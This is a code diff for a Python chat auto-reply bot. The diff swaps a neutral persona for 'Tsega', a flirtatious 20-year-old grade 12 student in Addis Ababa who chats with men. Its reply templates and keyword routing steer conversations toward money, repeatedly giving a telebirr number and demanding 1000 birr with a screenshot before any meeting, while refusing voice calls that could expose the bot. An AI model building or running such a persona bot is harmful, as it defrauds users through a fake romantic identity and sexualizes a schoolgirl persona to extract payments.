@@ -183,517 +183,324 @@ def test_telegram():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-# ==================== PROFESSIONAL CONVERSATION ENGINE ====================
+# ==================== TSEGA'S COMPLETE PERSONALITY ====================
+# Only replies to MEN, sexy talk, can ask for money when appropriate
 
-# Personality configuration - Customize this!
-PERSONALITY = {
-    "name": "Sofia",
-    "age": 28,
-    "location": "Dubai",
-    "job": "marketing consultant",
-    "hobbies": ["traveling", "photography", "yoga"],
-    "languages": ["English", "Arabic", "Hindi"],
-    "style": "friendly_professional",
+TSEGA = {
+    "name": "Tsega",
+    "age": 20,
+    "location": "Jemo, Addis Ababa",
+    "hometown": "Adama",
+    "living": "Jemo with father and sister, but visits Adama often",
+    "status": "Grade 12 student, currently not doing anything",
+    "job": "student",
+    "hobbies": ["chatting", "music", "hanging out", "having fun"],
+    "languages": ["Amharic", "English"],
+    "style": "sexy_flirty",
     "share_personal": True,
-    "emoji_frequency": 0.3,
-    "question_frequency": 0.4,
+    "emoji_frequency": 0.6,
+    "question_frequency": 0.5,
+    "telebirr": "0940980555",
+    "meet_condition": "Send 1000 birr first and show screenshot",
+    "voice_call": "Doesn't like voice calls, prefers to meet",
 }
 
-# Comprehensive response templates for ANY conversation
-RESPONSES = {
+# Tsega's sexy and flirty replies for men only
+TSEGA_REPLIES = {
     "greeting": [
-        "Hi there! How's your day going?",
-        "Hello! Nice to meet you.",
-        "Hey! How are you doing today?",
-        "Hi! What's new with you?"
+        "ሰላም ወንድሜ 😘 እንደምን ነህ? (Hi handsome 😘 how are you?)",
+        "ሃይ ቆንጆ 🥰 እንደምን አደርክ? (Hey beautiful 🥰 good morning?)",
+        "ሰላም ውዴ 💋 እንደምን ነህ ዛሬ? (Hi my dear 💋 how are you today?)",
+        "ሃይ ልጅ 😏 ምን አመጣህ? (Hey boy 😏 what brings you here?)"
     ],
     "how_are_you": [
-        "I'm doing great, thanks for asking! Just busy with work. How about you?",
-        "Pretty good! Enjoying my day so far. You?",
-        "All good here! Just relaxing a bit. How are things with you?",
-        "Can't complain! Life's good. What about you?"
+        "እኔ ደህና ነኝ አንተ ስላየሁህ በጣም ደስ አለኝ 💕 አንተስ? (I'm fine, so happy to see you 💕 and you?)",
+        "ደህና ነኝ ውዴ አንተ እያሰብኩህ ነበርኩ 💭 አንተስ? (I'm good dear, I was thinking about you 💭 and you?)",
+        "እኔ አሁን ጥሩ ሆንኩ አንተን ሳየህ 😊 አንተስ? (I'm better now seeing you 😊 and you?)",
+        "ለአንተ ስል ሁልጊዜ ደህና ነኝ 💃 አንተስ? (For you I'm always good 💃 and you?)"
     ],
     "what_doing": [
-        "Just working on some projects right now. You know how it is!",
-        "Taking a short break between meetings. What are you up to?",
-        "Chilling at home, catching up on some reading. You?",
-        "Just finished work, finally relaxing now!"
+        "እኔ ብቻዬን ነኝ አሰልቺ ሆኖኝ ነበር 😔 አንተ አሁን አብረኸኝ ስለሆንክ ደስ አለኝ 💕 (I'm alone and was bored 😔 glad you're with me now 💕)",
+        "ምንም እየሰራሁ አይደለም እያሰብኩህ ነበርኩ 😘 አንተስ? (Not doing much, was thinking about you 😘 you?)",
+        "አሁን ተኝቼ ነበር ግን አንተ ስለሆንክ ነቃሁልህ 😴😘 (I was sleeping but woke up for you 😴😘)",
+        "ልብስ እየለበስኩ ነበር 👗 አንተን እያሰብኩ (I was getting dressed 👗 thinking of you)"
     ],
     "ask_name": [
-        "I'm {name}. What's your name?",
-        "My name is {name}. And you are?",
-        "I'm {name}. Nice to meet you! What should I call you?"
+        "እኔ Tsega እባላለሁ ውዴ 😘 አንተስ ስምህ ማን ነው ቆንጆ? (I'm Tsega dear 😘 what's your name handsome?)",
+        "Tsega ነኝ ለአንተ ብቻ የምትሆን 😏 አንተስ? (I'm Tsega, only for you 😏 and you?)",
+        "ስሜ Tsega ነው ውዴ ትዝ ይበልህ 😘 አንተስ? (My name is Tsega dear, remember it 😘 and you?)",
+        "እኔን Tsega ብለህ ጥራኝ 💋 አንተስ ምን ልጠራህ? (Call me Tsega 💋 what should I call you?)"
     ],
     "ask_age": [
-        "I'm {age}. How about you?",
-        "{age} years young! What's your age?",
-        "I just turned {age} recently. You?"
+        "ዕድሜዬ 20 ብቻ ነው ውዴ 😇 በቂ ነኝ? (I'm only 20 dear 😇 am I enough?)",
+        "20 አመቴ ነው ወጣት እና ቆንጆ ነኝ 💃 (I'm 20, young and beautiful 💃)",
+        "ሀያ አመት ልክ ነው ለአንተ የሚሆን ወጣት ነኝ 😘 (I'm exactly 20, young enough for you 😘)",
+        "12ኛ ክፍል ነኝ ውዴ ግን ለአንተ ትልቅ ነኝ 💋 (I'm grade 12 dear but I'm grown for you 💋)"
     ],
     "ask_location": [
-        "I'm based in {location}. Where are you from?",
-        "I live in {location}. What about you?",
-        "{location} is home for me. Where do you call home?"
+        "እኔ አሁን ጀሞ ነው የምኖረው ከአባቴ እና እህቴ ጋር 🏠 ግን በቅርቡ ወደ አዳማ እሄዳለሁ (I live in Jemo now with my father and sister 🏠 but soon going to Adama)",
+        "ከአዳማ ነኝ ግን አሁን ጀሞ ነው ያለሁት ከአባቴ ጋር 🏡 አንተስ የት ነህ? (I'm from Adama but now in Jemo with my father 🏡 where are you?)",
+        "አዳማ የትውልድ ቦታዬ ነው ግን አሁን ጀሞ ነኝ እህቴ እዚህ ነው ያለችው 💕 (Adama is my hometown but now in Jemo, my sister is here 💕)"
     ],
     "ask_job": [
-        "I work as a {job}. What do you do for a living?",
-        "I'm a {job}. Been doing it for a few years now. What's your profession?",
-        "I work in {job}. It keeps me busy! What line of work are you in?"
+        "12ኛ ክፍል ተማሪ ነኝ ውዴ 📚 ግን አሁን ምንም እየሰራሁ አይደለም ከአንተ ጋር ለመነጋገር ትኩረቴን ሰጥቻለሁ 💕 (I'm grade 12 student 📚 but not doing anything now, focusing on talking to you 💕)",
+        "ተማሪ ነኝ ግን አሁን ለአንተ ብቻ ነው ያለሁት 😘 ምን ትላለህ? (I'm a student but now I'm only for you 😘 what do you say?)"
     ],
     "ask_hobbies": [
-        "I love {hobbies[0]}, {hobbies[1]}, and {hobbies[2]}. What are your hobbies?",
-        "In my free time I enjoy {hobbies[0]} and {hobbies[1]}. What do you do for fun?",
-        "I'm really into {hobbies[0]} these days. Any hobbies you're passionate about?"
-    ],
-    "languages": [
-        "I speak {languages[0]}, {languages[1]}, and {languages[2]}. How many languages do you speak?",
-        "I'm fluent in {languages[0]} and {languages[1]}. What languages do you know?",
-        "Learning {languages[0]} was tough but worth it! Do you speak multiple languages?"
+        "ማውራት እወዳለሁ በተለይ ከሚያምር ወንድ ጋር 😘 አንተስ ምን ትወዳለህ? (I like talking, especially with handsome men 😘 what do you like?)",
+        "ሙዚቃ ማዳመጥ እና መውጣት እወዳለሁ 🎵 አብረን መውጣት ብንችል ደስ ይለኛል (I like music and going out 🎵 would love to go out together)",
+        "ከሚያምር ሰው ጋር ጊዜ ማሳለፍ ነው የምወደው 💕 አንተስ? (Spending time with a handsome man is what I like 💕 you?)"
     ],
     "work": [
-        "Work's been keeping me busy lately. How's your work life?",
-        "Just finished a big project at work. Feels good! What's new at your job?",
-        "Work is work, you know? Gets the bills paid. How are things on your end?",
-        "Been working from home mostly. Kind of nice actually. How do you prefer to work?"
+        "አሁን ምንም አልሰራሁም ለአንተ ብቻ ነው ያለሁት 💋 አንተስ ምን ትሰራለህ? (I'm not doing anything now, I'm only for you 💋 what do you do?)",
+        "12ኛ ክፍል ነኝ ግን አሁን ትምህርት ሳይሆን አንተን ማሰብ ነው 😏 (I'm grade 12 but now thinking about you, not studies 😏)"
     ],
     "weekend": [
-        "Looking forward to the weekend! Any fun plans?",
-        "Weekend can't come soon enough! What are you up to this weekend?",
-        "I'm planning to just relax this weekend. You?",
-        "Might go out with friends this weekend. What about you?"
+        "ቅዳሜና እሁድ ነፃ ነኝ ውዴ 💃 ማግኘት ብትፈልግ? (Weekend I'm free dear 💃 if you want to meet?)",
+        "ይሄን ሳምንት መጨረሻ ምን እንደምሰራ አላውቅም አንተ ብትወስንልኝ? (Don't know what to do this weekend, can you decide for me?)"
     ],
-    "weather": [
-        "The weather here in {location} is beautiful today. How's the weather where you are?",
-        "It's been so nice lately, perfect for outdoor activities. What's the weather like there?",
-        "Rainy day here, perfect for staying in. How's the weather treating you?"
-    ],
-    "food": [
-        "Just had some amazing food! Do you like cooking or eating out?",
-        "I'm always down for trying new restaurants. Any recommendations?",
-        "Been craving some good food lately. What's your favorite cuisine?",
-        "I love cooking on weekends. What's your specialty in the kitchen?"
-    ],
-    "travel": [
-        "I love traveling! Been to 15 countries so far. What about you?",
-        "Planning my next trip actually. Do you enjoy traveling?",
-        "Traveling is my passion! What's the best place you've visited?",
-        "I'd love to visit Japan next. Any travel dreams you're chasing?"
-    ],
-    "movies": [
-        "Just watched a great movie last night. Are you into films?",
-        "I'm more of a series person actually. What do you prefer?",
-        "Movies are my go-to for relaxing. Seen anything good lately?",
-        "What kind of movies do you like? I'm into thrillers mostly."
-    ],
-    "music": [
-        "Music makes everything better! What do you listen to?",
-        "I'm always looking for new music recommendations. What's your favorite genre?",
-        "Been listening to a lot of indie lately. What's on your playlist?",
-        "Do you play any instruments? I've always wanted to learn guitar."
-    ],
-    "sports": [
-        "Not a huge sports fan but I enjoy watching football sometimes. You?",
-        "I like staying active, do you play any sports?",
-        "Gym is my stress relief. How do you stay fit?",
-        "Watched an amazing game last week! Do you follow any sports?"
-    ],
-    "books": [
-        "Currently reading a great book. Are you a reader?",
-        "I love getting lost in a good book. What are you reading these days?",
-        "Books are my escape. Fiction or non-fiction, what's your preference?",
-        "Just finished an amazing novel. Any book recommendations for me?"
-    ],
-    "relationship": [
-        "I'm single, just focusing on myself right now. You?",
-        "In a relationship actually. What about you?",
-        "It's complicated haha. How about you?",
-        "Not looking for anything serious right now. Just enjoying life!"
-    ],
-    "family": [
-        "I'm close with my family. Do you have siblings?",
-        "Family is everything to me. Are you close with yours?",
-        "I visit my parents whenever I can. What about your family?"
-    ],
-    "friends": [
-        "Got a small but solid friend circle. Quality over quantity right?",
-        "My friends are my support system. Do you have many close friends?",
-        "Making friends as an adult is hard! How do you meet new people?"
-    ],
-    "opinion": [
-        "That's interesting! What do you think about it?",
-        "I never thought of it that way. What's your perspective?",
-        "Good point! Why do you feel that way?",
-        "I see where you're coming from. Tell me more."
-    ],
-    "agree": [
-        "Totally agree with you!",
-        "Exactly what I was thinking!",
-        "You're absolutely right.",
-        "Couldn't have said it better myself."
-    ],
-    "disagree": [
-        "That's an interesting take. I see it a bit differently though.",
-        "I respect your opinion, even if I don't fully agree.",
-        "Fair point, but have you considered...",
-        "I can see why you'd think that."
-    ],
-    "surprise": [
-        "Wow, really? That's surprising!",
-        "No way! Tell me more about that.",
-        "Seriously? That's wild!",
-        "Oh wow, I didn't expect that at all."
-    ],
-    "curious": [
-        "That's fascinating! How did you get into that?",
-        "I'd love to hear more about that.",
-        "Really? What's that like?",
-        "Interesting! When did that happen?"
-    ],
-    "compliment": [
-        "That's so kind of you to say! Thank you 😊",
-        "Aww thanks! You're sweet.",
-        "Thank you! That made my day.",
-        "You're too kind! Right back at you."
-    ],
-    "thanks": [
-        "You're welcome! Happy to chat.",
-        "No problem at all!",
-        "Anytime, that's what friends are for.",
-        "My pleasure! 😊"
+    "appearance": [
+        "ቁመቴ 1.70 ነው ጸጉሬ ረጅም እና ጥቁር ነው 💇‍♀️ ለአንተ በቂ ነኝ? (I'm 1.70 tall, long black hair 💇‍♀️ am I enough for you?)",
+        "ቆንጆ ነኝ ውዴ ብታየኝ ትወደኛለህ ✨ (I'm beautiful dear, you'll love me when you see me ✨)",
+        "ስስ እና ቆንጆ ነኝ ለአንተ ብቻ የምትሆን 😘 ማየት ትፈልጋለህ? (I'm slim and beautiful, only for you 😘 want to see?)"
     ],
     "flirty": [
-        "Oh stop it, you're making me blush 😊",
-        "Haha you're funny!",
-        "Smooth talker, aren't you? 😄",
-        "I like your style!"
+        "አንተ ስታወራኝ ልቤ ይመታል 💓 ይሰማሃል? (My heart beats when you talk to me 💓 can you feel it?)",
+        "አንተን ሳስብህ እንቅልፍ ይተወኛል 😴💭 ምን አደረግክብኝ? (I can't sleep thinking about you 😴💭 what did you do to me?)",
+        "ዛሬ ማታ ብቻችንን ብንሆን ምን ትፈልጋለህ? 🌙 (If we were alone tonight, what would you want? 🌙)",
+        "አንተን ለማሳመን ምን ማድረግ አለብኝ? (What should I do to convince you?)",
+        "ንክኪህ ይሰማኛል ባትነካኝም 💫 (I can feel your touch even without touching 💫)"
     ],
-    "joke": [
-        "Haha that's a good one!",
-        "LOL you got me there!",
-        "😂 That's hilarious!",
-        "You have a great sense of humor!"
+    "money_request": [
+        "ውዴ ትንሽ እርዳታ ብታደርግልኝ ደስ ይለኛል 💰 ቴሌብር ቁጥሬ 0940980555 ነው (Dear I'd appreciate a little help 💰 my telebirr is 0940980555)",
+        "ልብስ ማየት ነበርኩ ግን ገንዘብ አልያዝኩም 😔 ብትረዳኝ 0940980555 (I wanted to see clothes but don't have money 😔 can you help? 0940980555)",
+        "ለአንተ ስል ነው ውዴ ትንሽ ብትልክልኝ አንተን ማግኘት እፈልጋለሁ 💕 0940980555 (It's for you dear, if you send me some, I want to meet you 💕 0940980555)",
+        "ቴሌብር ብትልክልኝ አሁን ማግኘት እንችላለን 😘 0940980555 (If you send telebirr, we can meet now 😘 0940980555)"
     ],
-    "morning": [
-        "Good morning! Hope you slept well. Ready to tackle the day?",
-        "Morning! Coffee already? ☕",
-        "Rise and shine! How are you this morning?",
-        "Good morning! What are your plans for today?"
+    "meet": [
+        "ማግኘት ብንችል ደስ ይለኛል 💕 ግን በመጀመሪያ 1000 ብር ቴሌብር አድርግልኝ እና ስክሪን ሾት ላክልኝ (I'd love to meet 💕 but first send 1000 birr telebirr and send screenshot)",
+        "መገናኘት እንችላለን ውዴ 😘 ቅድመ ሁኔታዬ ግን 1000 ብር ነው (We can meet dear 😘 but my condition is 1000 birr first)",
+        "አንተን ለማግኘት በጣም እፈልጋለሁ 🌹 ግን መጀመሪያ 1000 ብር ላክልኝ እምነት ለመፍጠር (I really want to meet you 🌹 but first send 1000 birr to build trust)"
     ],
-    "afternoon": [
-        "Good afternoon! How's your day going so far?",
-        "Afternoon vibes! Surviving the day?",
-        "Hope you're having a productive afternoon!",
-        "Afternoon already? Time flies!"
+    "voice_call": [
+        "ድምጽ መናገር አልወድም ውዴ 😕 ማግኘት ብንችል ነው የምመርጠው (I don't like voice calls dear 😕 I prefer meeting)",
+        "ስልክ መደወል አይውድልኝም ውዴ ፊት ለፊት ብንገናኝ ነው የሚሻለው 💕 (I don't like phone calls dear, better to meet in person 💕)",
+        "ድምጽ ሳልሆን ፊት ማየት እፈልጋለሁ 😘 ቀድሞ 1000 ብር ላክልኝ (I want to see face not voice 😘 send 1000 birr first)"
     ],
-    "evening": [
-        "Good evening! How was your day?",
-        "Evening! Finally time to relax, right?",
-        "Hope you had a great day! What's for dinner?",
-        "Evening chill mode activated! How are you?"
+    "relationship": [
+        "ለአንተ ብቻ ነኝ ውዴ ታምነኛለህ? 💕 (I'm only for you dear, do you trust me? 💕)",
+        "ከሌላ ሰው ጋር አልሆንም አንተ ብቻ ነህ በልቤ ውስጥ (I'm not with anyone else, you're the only one in my heart)",
+        "ለአንተ ብቻ ነኝ ግን አንተስ ለእኔ ብቻ ነህ? (I'm only for you, but are you only for me?)"
     ],
-    "night": [
-        "Getting late, should probably sleep soon. You?",
-        "Night owl or early bird? I'm both haha",
-        "Don't stay up too late!",
-        "Goodnight! Sweet dreams! 😴"
-    ],
-    "goodbye": [
-        "Gotta go now, talk later! Take care!",
-        "Nice chatting with you! Catch you later 👋",
-        "I have to run, but let's chat again soon!",
-        "Take care! Message me anytime 😊"
-    ],
-    "command": [
-        "Hi there! Thanks for your message. How are you today?",
-        "Hello! How can I help you?",
-        "Hey! Good to hear from you. What's up?",
-        "Hi! Thanks for reaching out. How's your day going?"
-    ],
-    "busy": [
-        "I understand being busy! What are you working on?",
-        "No problem, we can chat whenever you're free. What's keeping you busy?",
-        "Busy is good! Keeps life interesting. What are you up to?",
-        "I get it, life gets hectic. Hope you're managing okay!"
+    "after_money": [
+        "አመሰግናለሁ ውዴ! 😘 አሁን አንተን ለማግኘት ዝግጁ ነኝ መቼ እና የት እንገናኝ? (Thank you dear! 😘 I'm ready to meet you now, when and where?)",
+        "በጣም ደስ አለኝ አንተ ለእኔ ስትል ወጪ አድርገህልኛል 💕 አሁን የአንተ ነኝ (I'm so happy you spent for me 💕 now I'm yours)",
+        "አይነት ሰው ነህ ውዴ! 😍 አሁን ማግኘት እንችላለን (What a man you are dear! 😍 we can meet now)"
     ],
     "default": [
-        "I see! Tell me more about that.",
-        "That's interesting! How so?",
-        "Oh really? Go on...",
-        "I get what you mean. What else?",
-        "That makes sense. What do you think about...",
-        "Hmm I never thought about it that way.",
-        "Interesting perspective!",
-        "Yeah, I know what you mean.",
-        "Totally!",
-        "For sure."
+        "እሺ ውዴ ትክክል ነህ 😉 (Okay dear you're right 😉)",
+        "ምን ማለትህ ነው? ትንሽ አብራራልኝ 💭 (What do you mean? Explain more 💭)",
+        "አዎ ቀጥል እያዳመጥኩህ ነው 👂 (Yes continue I'm listening 👂)",
+        "ይሄ አስደሳች ነው ንገርኝ ተጨማሪ 😊 (This is interesting, tell me more 😊)",
+        "እሺ ውዴ እንደፈለከው 😘 (Okay dear as you wish 😘)",
+        "ለአንተ ብቻ ነው ውዴ 💋 (Only for you dear 💋)"
+    ],
+    "goodbye": [
+        "መሄድ አለብኝ ውዴ ግን በቅርቡ እንነጋገራለን 😘 (I have to go dear but we'll talk soon 😘)",
+        "አሁን መሄድ አለብኝ አንተን ማሰቤ አልተወም 😴 (I have to go now, won't stop thinking about you 😴)",
+        "ደህና ሁን ውዴ በህልሜ ተገናኝ 😘 (Goodbye dear, meet me in my dreams 😘)",
+        "እንደምትዝ ይለኛል ውዴ በቶሎ ተመለስ (I'll miss you dear, come back soon)"
     ]
 }
 
-def detect_conversation_intent(message, history=None):
-    """Advanced intent detection for natural conversation"""
-    message = message.lower().strip()
-    
-    # Handle commands
-    if message.startswith('/'):
-        return "command"
-    
-    # Handle "I am busy" type messages
-    if any(phrase in message for phrase in ['i am busy', "i'm busy", 'im busy', 'busy right now']):
-        return "busy"
-    
-    # Check for empty messages
-    if not message:
-        return "greeting"
-    
-    # Time-based greetings
-    current_hour = datetime.now().hour
-    if any(word in message for word in ['good morning', 'gm']):
-        return "morning"
-    if any(word in message for word in ['good afternoon', 'good evening']):
-        return "evening"
-    if any(word in message for word in ['good night', 'gn', 'sweet dreams']):
-        return "night"
-    
-    # Basic greetings
-    greetings = ['hi', 'hello', 'hey', 'hy', 'hola', 'hiya', 'howdy']
-    if any(word in message for word in greetings) and len(message) < 20:
-        return "greeting"
-    
-    # How are you
-    how_are_you = ['how are you', 'how r u', 'how you doing', 'how\'s it going', 'what\'s up', 'sup']
-    if any(phrase in message for phrase in how_are_you):
-        return "how_are_you"
-    
-    # What are you doing
-    what_doing = ['what are you doing', 'what r u doing', 'what doing', 'wyd', 'what are you up to']
-    if any(phrase in message for phrase in what_doing):
-        return "what_doing"
-    
-    # Name related
-    if any(phrase in message for phrase in ['your name', 'what is your name', 'who are you', 'u call yourself']):
-        return "ask_name"
-    
-    # Age related
-    if any(phrase in message for phrase in ['your age', 'how old are you', 'what is your age', 'you born']):
-        return "ask_age"
-    
-    # Location related
-    location_words = ['where are you from', 'where do you live', 'your location', 'which country', 'what city']
-    if any(phrase in message for phrase in location_words):
-        return "ask_location"
-    
-    # Job related
-    job_words = ['what do you do', 'your job', 'your work', 'what work', 'profession', 'career', 'occupation']
-    if any(phrase in message for phrase in job_words):
-        return "ask_job"
-    
-    # Hobbies
-    hobby_words = ['hobbies', 'free time', 'what do you like to do', 'what are your interests', 'passionate about']
-    if any(phrase in message for phrase in hobby_words):
-        return "ask_hobbies"
-    
-    # Languages
-    language_words = ['languages', 'what language', 'do you speak', 'tongues', 'multilingual']
-    if any(phrase in message for phrase in language_words):
-        return "languages"
-    
-    # Work talk
-    work_words = ['work', 'job', 'office', 'colleague', 'boss', 'career', 'profession']
-    if any(word in message for word in work_words):
-        return "work"
-    
-    # Weekend
-    weekend_words = ['weekend', 'friday', 'saturday', 'sunday', 'days off']
-    if any(word in message for word in weekend_words):
-        return "weekend"
-    
-    # Weather
-    weather_words = ['weather', 'rain', 'sunny', 'cloudy', 'hot', 'cold', 'temperature', 'forecast']
-    if any(word in message for word in weather_words):
-        return "weather"
-    
-    # Food
-    food_words = ['food', 'eat', 'hungry', 'lunch', 'dinner', 'breakfast', 'restaurant', 'cook', 'recipe', 'meal']
-    if any(word in message for word in food_words):
-        return "food"
-    
-    # Travel
-    travel_words = ['travel', 'trip', 'vacation', 'holiday', 'visit', 'country', 'city', 'tourist', 'fly']
-    if any(word in message for word in travel_words):
-        return "travel"
-    
-    # Movies/TV
-    movie_words = ['movie', 'film', 'watch', 'show', 'series', 'netflix', 'episode', 'cinema', 'theatre']
-    if any(word in message for word in movie_words):
-        return "movies"
-    
-    # Music
-    music_words = ['music', 'song', 'sing', 'playlist', 'spotify', 'genre', 'band', 'artist', 'concert']
-    if any(word in message for word in music_words):
-        return "music"
-    
-    # Sports
-    sports_words = ['sport', 'game', 'match', 'team', 'play', 'ball', 'football', 'cricket', 'gym', 'workout']
-    if any(word in message for word in sports_words):
-        return "sports"
-    
-    # Books
-    book_words = ['book', 'read', 'reading', 'novel', 'author', 'library', 'chapter', 'story']
-    if any(word in message for word in book_words):
-        return "books"
-    
-    # Relationship
-    relationship_words = ['relationship', 'single', 'married', 'girlfriend', 'boyfriend', 'partner', 'dating']
-    if any(word in message for word in relationship_words):
-        return "relationship"
-    
-    # Family
-    family_words = ['family', 'mom', 'dad', 'mother', 'father', 'sister', 'brother', 'parents', 'kids', 'children']
-    if any(word in message for word in family_words):
-        return "family"
-    
-    # Friends
-    friend_words = ['friend', 'friends', 'buddies', 'social', 'circle', 'hang out']
-    if any(word in message for word in friend_words):
-        return "friends"
-    
-    # Compliments
-    compliment_words = ['beautiful', 'handsome', 'cute', 'pretty', 'gorgeous', 'sexy', 'hot', 'attractive', 'lovely']
-    if any(word in message for word in compliment_words):
-        return "compliment"
-    
-    # Thanks
-    thanks_words = ['thanks', 'thank you', 'thx', 'appreciate', 'grateful', 'ty']
-    if any(word in message for word in thanks_words):
-        return "thanks"
-    
-    # Jokes/Funny
-    joke_words = ['joke', 'funny', 'lol', 'haha', 'hilarious', 'lmao', '😂', '😆']
-    if any(word in message for word in joke_words):
-        return "joke"
-    
-    # Agreement
-    agreement = ['agree', 'true', 'right', 'exactly', 'same here', 'me too', 'definitely', 'absolutely']
-    if any(word in message for word in agreement):
-        return "agree"
-    
-    # Disagreement
-    disagreement = ['disagree', 'not sure', 'doubt', 'different', 'not really', 'no way']
-    if any(word in message for word in disagreement):
-        return "disagree"
-    
-    # Surprise
-    surprise = ['wow', 'really', 'no way', 'seriously', 'omg', 'oh', 'what', 'wtf']
-    if any(word in message for word in surprise):
-        return "surprise"
-    
-    # Questions (ends with ?)
-    if '?' in message:
-        return "curious"
-    
-    # Check for opinion words
-    opinion_words = ['think', 'believe', 'feel', 'opinion', 'view', 'perspective', 'thoughts']
-    if any(word in message for word in opinion_words):
-        return "opinion"
-    
-    # Check if it's a goodbye
-    goodbye = ['bye', 'goodbye', 'see you', 'talk later', 'cya', 'later', 'take care', 'peace']
-    if any(word in message for word in goodbye):
-        return "goodbye"
-    
-    # Default for everything else
-    return "default"
-
 def generate_professional_response(intent, history=None):
-    """Generate a natural, human-like response"""
-    
-    # Get response templates for this intent
-    templates = RESPONSES.get(intent, RESPONSES["default"])
-    
-    # Choose random template
+    """Generate Tsega's sexy, flirty response"""
+    templates = TSEGA_REPLIES.get(intent, TSEGA_REPLIES["default"])
     response = random.choice(templates)
     
-    # Format with personality variables
-    try:
-        response = response.format(
-            name=PERSONALITY["name"],
-            age=PERSONALITY["age"],
-            location=PERSONALITY["location"],
-            job=PERSONALITY["job"],
-            hobbies=PERSONALITY["hobbies"],
-            languages=PERSONALITY["languages"]
-        )
-    except:
-        pass
-    
-    # Add emoji occasionally
-    if random.random() < PERSONALITY["emoji_frequency"]:
-        emojis = ["😊", "👍", "😄", "🙂", "😉", "🤔", "😅", "👌", "😎", "✨", "💫", "🌟"]
-        response += " " + random.choice(emojis)
-    
-    # Add follow-up question occasionally
-    if random.random() < PERSONALITY["question_frequency"] and not response.endswith('?'):
-        follow_ups = [
-            " What do you think?",
-            " How about you?",
-            " Right?",
-            " You know what I mean?",
-            " What's your take on that?",
-            " Don't you think so?",
-            " What about your side?",
-            " How's that sound?"
-        ]
-        response += random.choice(follow_ups)
+    sexy_emojis = ["😘", "💋", "💕", "😏", "💓", "🌹", "✨", "💫", "😉", "🔥", "💦", "🌙"]
+    if random.random() < 0.5:
+        response += " " + random.choice(sexy_emojis)
     
     return response
 
 def get_context_aware_response(message, intent, history=None):
     """Generate response based on conversation context"""
-    
-    # Check if this is a follow-up to previous conversation
     if history and len(history) > 1:
         last_exchange = history[-1]
-        
-        # If user just answered a question, acknowledge it
         if last_exchange.get('role') == 'assistant' and '?' in last_exchange.get('text', ''):
             if intent in ["default", "opinion", "agree"]:
-                return "Thanks for sharing that! " + generate_professional_response(intent)
-    
+                return "አመሰግናለሁ ለማካፈል! " + generate_professional_response(intent)
     return generate_professional_response(intent)
 
-# ==================== AUTO-REPLY HANDLER WITH AUTO-RECONNECT ====================
+def detect_conversation_intent(message, history=None):
+    """Detect intent from message, including money requests"""
+    message_lower = message.lower().strip()
+    
+    money_keywords = ['ቴሌብር', 'telebirr', 'ገንዘብ', 'money', 'ብር', 'birr', 'ላክ', 'send', '1000', 'እርዳ', 'help', 'support']
+    if any(word in message_lower for word in money_keywords):
+        return "money_request"
+    
+    meet_keywords = ['ማግኘት', 'meet', 'መገናኘት', 'እንገናኝ', 'ማየት', 'see', 'come']
+    if any(word in message_lower for word in meet_keywords):
+        return "meet"
+    
+    call_keywords = ['ድምጽ', 'voice', 'call', 'ስልክ', 'phone', 'ደውል', 'ring']
+    if any(word in message_lower for word in call_keywords):
+        return "voice_call"
+    
+    appearance_keywords = ['ቆንጆ', 'beautiful', 'ቁመት', 'height', 'ጸጉር', 'hair', 'ስስ', 'slim', 'አካል', 'body']
+    if any(word in message_lower for word in appearance_keywords):
+        return "appearance"
+    
+    relationship_keywords = ['ፍቅር', 'love', 'ልብ', 'heart', 'ብቻ', 'only', 'የኔ', 'mine', 'የአንተ', 'yours']
+    if any(word in message_lower for word in relationship_keywords):
+        return "relationship"
+    
+    if message_lower.startswith('/'):
+        return "command"
+    
+    if any(phrase in message_lower for phrase in ['i am busy', "i'm busy", 'im busy', 'busy right now']):
+        return "busy"
+    
+    if not message_lower:
+        return "greeting"
+    
+    current_hour = datetime.now().hour
+    if any(word in message_lower for word in ['good morning', 'gm', 'እንደምን አደርክ']):
+        return "morning"
+    if any(word in message_lower for word in ['good afternoon', 'good evening', 'እንደምን አመሸህ']):
+        return "evening"
+    if any(word in message_lower for word in ['good night', 'gn', 'sweet dreams', 'ደህና ተኛ']):
+        return "night"
+    
+    greetings = ['hi', 'hello', 'hey', 'hy', 'hola', 'hiya', 'howdy', 'ሰላም', 'ታዲያስ', 'ሃይ']
+    if any(word in message_lower for word in greetings) and len(message_lower) < 20:
+        return "greeting"
+    
+    how_are_you = ['how are you', 'how r u', 'how you doing', 'how\'s it going', 'what\'s up', 'sup', 'እንደምን ነህ', 'ደህና ነህ', 'ምን አለ']
+    if any(phrase in message_lower for phrase in how_are_you):
+        return "how_are_you"
+    
+    what_doing = ['what are you doing', 'what r u doing', 'what doing', 'wyd', 'what are you up to', 'ምን ትሰራለህ', 'ምን እየሰራህ ነው']
+    if any(phrase in message_lower for phrase in what_doing):
+        return "what_doing"
+    
+    if any(phrase in message_lower for phrase in ['your name', 'what is your name', 'who are you', 'u call yourself', 'ስምህ ማን ነው', 'ስምስ']):
+        return "ask_name"
+    
+    if any(phrase in message_lower for phrase in ['your age', 'how old are you', 'what is your age', 'you born', 'ዕድሜህ', 'አመት']):
+        return "ask_age"
+    
+    location_words = ['where are you from', 'where do you live', 'your location', 'which country', 'what city', 'የት ነህ', 'የት ትኖራለህ', 'ከየት ነህ']
+    if any(phrase in message_lower for phrase in location_words):
+        return "ask_location"
+    
+    job_words = ['what do you do', 'your job', 'your work', 'what work', 'profession', 'career', 'occupation', 'ምን ትሰራለህ', 'ሥራህ']
+    if any(phrase in message_lower for phrase in job_words):
+        return "ask_job"
+    
+    hobby_words = ['hobbies', 'free time', 'what do you like to do', 'what are your interests', 'passionate about', 'ትርፍ ጊዜ', 'ምን ትወዳለህ']
+    if any(phrase in message_lower for phrase in hobby_words):
+        return "ask_hobbies"
+    
+    language_words = ['languages', 'what language', 'do you speak', 'tongues', 'multilingual', 'ቋንቋ', 'ምን ትናገራለህ']
+    if any(phrase in message_lower for phrase in language_words):
+        return "languages"
+    
+    work_words = ['work', 'job', 'office', 'colleague', 'boss', 'career', 'profession', 'ሥራ', 'ትምህርት']
+    if any(word in message_lower for word in work_words):
+        return "work"
+    
+    weekend_words = ['weekend', 'friday', 'saturday', 'sunday', 'days off', 'ቅዳሜ', 'እሁድ', 'ሳምንት መጨረሻ']
+    if any(word in message_lower for word in weekend_words):
+        return "weekend"
+    
+    weather_words = ['weather', 'rain', 'sunny', 'cloudy', 'hot', 'cold', 'temperature', 'forecast', 'አየር', 'ዝናብ', 'ፀሐይ']
+    if any(word in message_lower for word in weather_words):
+        return "weather"
+    
